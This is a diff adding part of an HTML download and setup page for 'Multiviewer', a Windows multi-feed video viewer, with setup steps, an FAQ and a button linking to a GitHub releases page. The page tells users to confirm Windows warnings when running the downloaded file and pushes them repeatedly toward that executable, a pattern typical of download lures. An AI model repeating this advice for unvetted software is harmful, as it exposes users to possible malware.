+    <strong>Keep this page handy.</strong> If you ever need to reinstall Multiviewer, set it up on a second computer, or check whether a newer version is available, come back to the same link. It always points to the current release.
+  </div>
+
+  <h2>🖥️ Getting Started for the First Time</h2>
+
+  <ol class="steps">
+    <li><strong>Open the releases page.</strong> Use the download button above or the link in the previous section. The newest release is at the top of the list.</li>
+    <li><strong>Download the application from that page.</strong> The download begins once you choose the file offered on the page, and it is saved to your Downloads folder.</li>
+    <li><strong>Open the file you downloaded.</strong> If Windows asks whether you want to allow the application to run, confirm so that it can start.</li>
+    <li><strong>Connect your video sources before you look for them.</strong> Plug in your cameras and capture cards, and make sure any screen share or network stream you plan to use is already running. Multiviewer can only see a source once the source is actually available.</li>
+    <li><strong>Add your first tile.</strong> In Multiviewer, open the list of available sources and pick one. It appears as a tile in the main window.</li>
+    <li><strong>Repeat for each additional feed.</strong> Add the rest of your sources one at a time. Start with two or three, confirm that each one shows a picture, and then add more.</li>
+    <li><strong>Adjust the layout.</strong> Drag the tiles until the arrangement suits the way you work, and resize the important ones so they are easy to see at a glance.</li>
+  </ol>
+
+  <p>That is the whole process. There is no account to create, no subscription to manage, and no cloud service to sign into. Everything runs locally on your own computer.</p>
+
+  <h2>💡 Tips for a Smooth Experience</h2>
+
+  <ul>
+    <li><strong>Start small.</strong> Add one source, confirm it works, then add the next. If something does not appear, you immediately know which feed caused it.</li>
+    <li><strong>Give your computer some breathing room.</strong> Every tile is a live video stream, and live video uses processing power. If the picture becomes choppy, remove a tile or two and check whether things recover.</li>
+    <li><strong>Keep source windows visible where needed.</strong> Some sharing methods only send video while the original application is open and running.</li>
+    <li><strong>Use wired connections for network video.</strong> A network camera or stream is far more stable over a cable than over a weak wireless signal.</li>
+    <li><strong>Update when you notice a new release.</strong> The releases page shows the newest version first, so a quick visit tells you whether anything has changed.</li>
+  </ul>
+
+  <h2>🧩 What You Need</h2>
+
+  <p>Multiviewer is designed for Windows. A reasonably modern computer with a current version of Windows and a working graphics driver is the right starting point. Because video work is demanding, a machine that handles other video software comfortably will handle Multiviewer comfortably too.</p>
+
+  <p>Beyond the computer itself, you need whatever sources you plan to watch: a webcam, a capture card, a phone or computer sending an NDI stream, or a display you want to mirror. The more sources you add at once, the more capable your computer should be. If you are unsure, begin with a single source and add more gradually — that is the most reliable way to find the limit of your particular machine.</p>
+
+  <div class="card">
+    <h3>In short</h3>
+    <ul>
+      <li>A Windows computer with a current graphics driver.</li>
+      <li>At least one video source connected or running.</li>
+      <li>Enough spare processing power for the number of tiles you want.</li>
+    </ul>
+  </div>
+
+  <h2>🛠️ Troubleshooting</h2>
+
+  <p class="faq-q">My camera does not appear in the source list.</p>
+  <p class="faq-a">Close Multiviewer, plug the camera in, wait a moment, then reopen the application. Also check that no other program is currently using the camera — many cameras can only be opened by one application at a time.</p>
+
+  <p class="faq-q">The download page shows a list of versions.</p>
+  <p class="faq-a">That is expected. The releases page groups files by version, with the newest at the top. Choose the newest version and use the download offered there.</p>
+
+  <p class="faq-q">The picture is not smooth.</p>
+  <p class="faq-a">Reduce the number of tiles on screen, or lower the size of the largest tiles. Live video is heavy work, and fewer or smaller streams leave more room for the ones you are actually watching.</p>
+
+  <p class="faq-q">A network source stays black.</p>
+  <p class="faq-a">Confirm the sending device is still running and that both computers are on the same network. Network video needs an active sender at all times.</p>
+
+  <h2>❓ Frequently Asked Questions</h2>
+
+  <p class="faq-q">Is Multiviewer free to download?</p>
+  <p class="faq-a">The application is distributed through its public releases page on GitHub. Visit the download link above to see the available versions and what each one contains.</p>
+
+  <p class="faq-q">Do I need to install anything else first?</p>
+  <p class="faq-a">No extra steps are needed beyond downloading from the releases page and opening the file. If your devices already work in other video software on the same computer, they are ready to use.</p>
+
+  <p class="faq-q">Can I use more than one type of source at the same time?</p>
+  <p class="faq-a">Yes. That is the point of the application. A webcam, a capture card, a screen share, and a network stream can all be shown together in the same grid.</p>
+
+  <p class="faq-q">Does Multiviewer change or record my video?</p>
+  <p class="faq-a">Multiviewer is a viewer. It displays your sources together so you can watch them; it does not alter the original feeds.</p>
+
+  <h2>📦 About the Project</h2>
+
+  <p>Multiviewer is built in Rust with a wgpu rendering backend, which is how it can handle many video protocols efficiently while keeping the interface responsive. Its source support spans AVFoundation, DeckLink, DirectShow, Media Foundation, NDI, screen capture, Spout2, and Syphon — a deliberately broad set, so that users are not forced to standardise on a single vendor or a single connector type.</p>
+
+  <p>The practical benefit for you, as someone using the application rather than building it, is straightforward: whatever equipment you already own is likely to work. You are not buying new hardware to fit the software.</p>
+
+  <h2>⬇️ Download Multiviewer</h2>
+
+  <p>Ready to see all of your video feeds at once? Visit this link to download the application:</p>
+
+  <div class="btn-row">
+    <a class="btn" href="https://github.com/ArMohadWaseem90/Multiviewer/releases">⬇️ Get Multiviewer from GitHub Releases</a>
+  </div>
+
+  <p>The releases page opens with the newest version at the top. Use the download offered there, open the file once it has finished downloading, and you are ready to add your first source.</p>
+
+</div>
 </body>
 </html>
